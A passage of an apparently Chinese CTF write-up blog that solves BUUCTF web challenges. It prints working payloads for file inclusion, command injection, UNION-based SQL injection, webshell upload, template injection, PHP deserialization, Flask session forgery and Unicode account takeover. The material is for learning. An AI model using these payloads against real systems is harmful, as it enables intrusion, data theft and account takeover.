&quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>直接访问无法读取内容，故以base64编码方式读取源码，解码后得到flag。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://f3925568-2385-4077-988b-ba86518a9ac0.node4.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>使用<code>?ip=1|ls</code>查看目录下文件，然后用<code>?ip=1|cat$IFS$1index.php</code>得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload执行后查看源码即可得到flag。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#base64编码</span></span><br><span class="line">http://edccc6cc-6b6c-4081-aae7-638533e910d7.node4.buuoj.cn:81/?ip=1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|<span class="attribute">sh</span></span><br><span class="line"><span class="comment">#拼接绕过re</span></span><br><span class="line">http://edccc6cc-6b6c-4081-aae7-638533e910d7.node4.buuoj.cn:81/?ip=1;i=g;cat$IFS$1fla$i.php</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>F12审计代码发现是通过<code>check.php</code>验证get请求，尝试后发现用户名使用了<code>&#39;&#39;</code>且密码使用了<code>&quot;&quot;</code>处理，尝试使用万能密码登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆出密码9fa5459ff2ff5f4584bd0f2a58c5e67</span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=admin&#x27; or &#x27;1=1&amp;password=admin</span><br></pre></td></tr></table></figure><p>爆出密码后尝试md5解密发现不对，继续sql注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#发现有3个字段</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=admin&#x27; <span class="attribute">order</span> by <span class="number">4</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#查看数据库和版本(geek,10.3.18-MariaDB)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,database(),version()%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#爆表(geekuser,l0ve1ysq1)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;geek&#x27;</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#爆列(id,username,password)</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span>%<span class="number">23</span>&amp;password=admin</span><br><span class="line"><span class="comment">#爆密码获得flag</span></span><br><span class="line">http://a4bd697d-72dc-42fa-9388-69687fa5534e.node4.buuoj.cn:81/check.php?username=-1&#x27; union <span class="literal">select</span> <span class="number">1</span>,group_concat(password),<span class="number">3</span> from l0ve1ysq1%<span class="number">23</span>&amp;password=admin</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>蚁剑直接连，密码是<code>Syc</code></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>F12发现存在<code>Secret.php</code></p><p>访问后发现<code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code>，故用burp抓包修改<code>Referer</code></p><p>发现提示要使用<code>Syclover browser</code>，故修改<code>User-Agent</code> </p><p>发现要从本地访问，故修改<code>X-Forwarded-For:</code>，最终得到flag</p><p><img src="https://img.gejiba.com/images/24b3af12dcc7500fb4cf10f9d59afa95.png" alt="24b3af12dcc7500fb4cf10f9d59afa95.png"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>访问<code>http://0ff1b314-797b-4c30-87dd-a290016743a5.node4.buuoj.cn:81/upload/</code>即可看到上传的文件，发现其中有<code>.phtml</code>后缀的文件，故抓包上传一句话木马</p><p><img src="https://img.gejiba.com/images/60a06a2b61e800d1e7cf350579dd6c2c.png" alt="60a06a2b61e800d1e7cf350579dd6c2c.png"></p><p>上传后post传输<code>attack=system(&#39;cat /flag&#39;);</code>即可。</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>黑名单过滤，抓包修改后缀为<code>.phtml</code>即可</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>过滤了一些关键字，采用双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看当前库</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,database()%23</span><br><span class="line">#爆库 ctf</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23</span><br><span class="line">#爆表 Flag</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;ctf&#x27;%23</span><br><span class="line">#爆列 flag</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;Flag&#x27;%23</span><br><span class="line">#爆内容</span><br><span class="line">http://f2e0cf42-dbf4-456f-a911-f361f830440d.node4.buuoj.cn:81/check.php?username=1&amp;password=1&#x27;ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag%23</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>访问<code>calc.php</code>可以看到部分源码，利用num进行传参，在num前添加空格可以绕过注释所说的waf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列出文件 var_dump(scandir(/))</span><br><span class="line">http://node4.buuoj.cn:28694/calc.php? num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">#读取flag file_get_contents(/f1agg)</span><br><span class="line">http://node4.buuoj.cn:28694/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><blockquote><p><code>scandir()</code>返回指定目录中的文件和目录的数组<br><code>scandir(/)</code>相当于<code>ls /</code><br><code>var_dump()</code>相当于<code>echo</code></p></blockquote><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>访问<code>www.zip</code>获取备份文件，<code>index.php</code>中有如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>故可能存在反序列化漏洞，查看<code>class.php</code>，构造反序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).PHP_EOL;</span><br></pre></td></tr></table></figure><p>最后的payload注意将属性个数的值大于实际属性个数，这样来绕过<code>_wakeup</code>函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a0fdf051-a2ba-4c99-b18a-b865bd40854b.node4.buuoj.cn:81/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure><blockquote><p>之所以使用urlencode，是因为输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）。</p></blockquote><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>访问<code>/index.php.bak</code>获取源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入参数<code>/index.php?key=123</code>即可。</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>尝试访问<code>/file?filename=/fllllllllllllag&amp;filehash=7fd8270fd39d39b0929871611f8ae16c</code>，跳转网页<code>/error?msg=Error</code>。</p><p>网上搜索<code>tornado</code>框架漏洞，访问<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;bb8b6eb6-7da3-40d4-a2b9-1fe70b347cfd&#x27;&#125; </span><br></pre></td></tr></table></figure><p>根据<code>hints.txt</code>中的公式<code>md5(cookie_secret+md5(filename))</code>获取hash值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;bb8b6eb6-7da3-40d4-a2b9-1fe70b347cfd&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;/fllllllllllllag&#x27;</span>));</span><br><span class="line"><span class="comment">//40b1b5314c975858de339d17ea5c5327</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=40b1b5314c975858de339d17ea5c5327</span><br></pre></td></tr></table></figure><blockquote><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p></blockquote><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>通过首页右上角菜单进入<code>pay.php</code>，查看源码后在最底部发现一段被注释代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>修改<code>cookie</code>的<code>user</code>参数确保<code>a student from CUIT</code>，post请求传递<code>money</code>以及<code>password</code>，构造exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e57bb518-ccb6-4799-85a0-4be6f2483e5c.node4.buuoj.cn:81/pay.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;404a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;money[]&#x27;</span>:<span class="string">&#x27;100000000&#x27;</span>, <span class="comment">#用数组绕过，不然会提示长度过长</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span> :<span class="string">&#x27;td_cookie=1001369429;user=1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;flag&#123;.*?&#125;&#x27;</span>,response.text)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>也可以直接用<code>hackbar</code></p><p><img src="https://img.gejiba.com/images/7e34ec20a72163fa01c9b4ace82753c2.png" alt="7e34ec20a72163fa01c9b4ace82753c2.png"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="法一-弱口令"><a href="#法一-弱口令" class="headerlink" title="法一 弱口令"></a>法一 弱口令</h3><p>尝试了下用户名<code>admin</code>和密码<code>123</code>发现直接登陆成功获得flag了。。。</p><h3 id="法二-flask-session伪造"><a href="#法二-flask-session伪造" class="headerlink" title="法二 flask session伪造"></a>法二 flask session伪造</h3><p>注册帐号登陆后在<code>change</code>页面发现源码地址</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>config.py</code>中发现<code>SECRET_KEY</code>值为<code>ckj123</code>，然后查看自身<code>session</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJxFkE9rwkAQxb9K2bOH_LEXwYMlm5DCzLKym5C9iDbRZJK1kETUFb97FwvtaXj8Zt7w3oPtjmMztWw1j5dmwXZdzVYP9nZgKyYSeQdXDEB6aSz2YHUslL6BSztDaJE-BqFkiIl0oCAAdYqg5FdjtcOSB2D5zai0NVa-i8TvO7iKMo-BTkFFBVVeY7KlSulAZCmZMiVUbYuUh0D-g6o94xG6zdIoeYWMx-C0n9p7mx4zfccoD9DqNXsu2Nc0Hnfzd9-c_yJUrh4q8qdUd5B8DlVZWGMhBJdHQDLGrBhEWZBJdGSIh-hMD3L9suvs_tT8l8HTfLv5Jee99YDNzTSzBbtMzfiqjYUBe_4AXrRs8w.YqfSfQ.q8V8VQqzgvXkoXOw-HI4HWl5qGQ</span><br></pre></td></tr></table></figure><p>使用<a href="https://blog.csdn.net/qq_42158602/article/details/103936540">大佬的脚本</a>解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode()))</span></span><br><span class="line">    session = <span class="string">&#x27;.eJxFkE9rwkAQxb9K2bOH_LEXwYMlm5DCzLKym5C9iDbRZJK1kETUFb97FwvtaXj8Zt7w3oPtjmMztWw1j5dmwXZdzVYP9nZgKyYSeQdXDEB6aSz2YHUslL6BSztDaJE-BqFkiIl0oCAAdYqg5FdjtcOSB2D5zai0NVa-i8TvO7iKMo-BTkFFBVVeY7KlSulAZCmZMiVUbYuUh0D-g6o94xG6zdIoeYWMx-C0n9p7mx4zfccoD9DqNXsu2Nc0Hnfzd9-c_yJUrh4q8qdUd5B8DlVZWGMhBJdHQDLGrBhEWZBJdGSIh-hMD3L9suvs_tT8l8HTfLv5Jee99YDNzTSzBbtMzfiqjYUBe_4AXrRs8w.YqfSfQ.q8V8VQqzgvXkoXOw-HI4HWl5qGQ&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(session.encode()))</span><br></pre></td></tr></table></figure><p>获得以下信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;84235e258fcd2e795131bf3f60e9454431341861a0fe35a42a1e1afd983f7309b7284b5cc3044ca548aceac58a62526c57ca16708e400a73500e42fd4e27b46e&#x27;, &#x27;csrf_token&#x27;: b&#x27;c7eb4027b02eaeffc53262474ee9ecd56f1576d1&#x27;, &#x27;image&#x27;: b&#x27;8AHD&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>修改其中<code>name</code>为<code>admin</code>，并使用<a href="https://github.com/noraj/flask-session-cookie-manager">session工具</a>进行加密（<code>secret_key</code>可以在）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;84235e258fcd2e795131bf3f60e9454431341861a0fe35a42a1e1afd983f7309b7284b5cc3044ca548aceac58a62526c57ca16708e400a73500e42fd4e27b46e&#x27;, &#x27;csrf_token&#x27;: b&#x27;c7eb4027b02eaeffc53262474ee9ecd56f1576d1&#x27;, &#x27;image&#x27;: b&#x27;8AHD&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>获得加密后的session</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJxFkM1rwkAQxf-VMmcP-bAXwYMlH6Qws6zsJmQvok00mWQtREVd8X_vYqE9DY_fzBvee8BmP7WnDhbn6dLOYNM3sHjA2w4WIBJ5R1eOyHpuLA1odSyUvqHLesNkiT9GoWRIiXSoMEB1iLBKr8ZqR1UaoE1vRmWdsfJdJH7f4VVURYx8CGouufaakjXXSgciz9hUGZPqOuIiRPYfVONZGpFbzY2SV8zTGJ32U3tvM1Cu7xQVAVm9hOcMvk7TfnP-HtrjX4TaNWPN_pSbHpPPsa5KayyG6IoIWcaUl6OoSjaJjgynITkzoFy-7Hq7PbT_ZaRZsV79kuPWegDbxvZHmMHl1E6v3iAM4PkDy4ptPA.YqfTiA.v_KfECOg4L_7siBugo4wDmZ7Qh0</span><br></pre></td></tr></table></figure><p>用burp发包即可</p><p><img src="https://img.gejiba.com/images/b9bc41d1864208f98c0bd431f61112b0.png" alt="b9bc41d1864208f98c0bd431f61112b0.png"></p><h3 id="法三-Unicode欺骗"><a href="#法三-Unicode欺骗" class="headerlink" title="法三 Unicode欺骗"></a>法三 Unicode欺骗</h3><p>使用<code>ᴬᴰᴹᴵᴺ</code>注册账户，然后就可以登录。登录成功后显示你用户名为<code>ADMIN</code>，然后修改密码，此时其实是把<code>admin</code>的密码修改了，然后登录<code>admin</code>即可。主要是利用了<code>register</code>和<code>change</code>里面的漏洞，会把输入字符转化成小写。</p><blockquote><p>参考：<a href="https://blog.csdn.net/Obs_cure/article/details/113805070?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-113805070-blog-103936540.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-113805070-blog-103936540.pc_relevant_aa&utm_relevant_index=1">CTF学习笔记——[HCTF 2018]admin</a></p></blockquote><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>使用<code>burp</code>抓包发现<code>hint</code></p><p><img src="https://img.gejiba.com/images/cb8b462b474b2a4106b805b7706100ff.png" alt="cb8b462b474b2a4106b805b7706100ff.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>输入<code>ffifdyop</code>进入下一关，</p><blockquote><p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;6xxxxx&#x27;</span><br></pre></td></tr></table></figure><p>总结下3个常用的：ffifdyop；e58；611686052576742364；</p></blockquote><p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><p>发现源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://16daade5-17e1-4422-b3e6-ac4f89b74c42.node4.buuoj.cn:81/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>post</code>请求使用数组绕过即可获得flag</p><blockquote><p>这里若是修改判断条件为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; </span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span 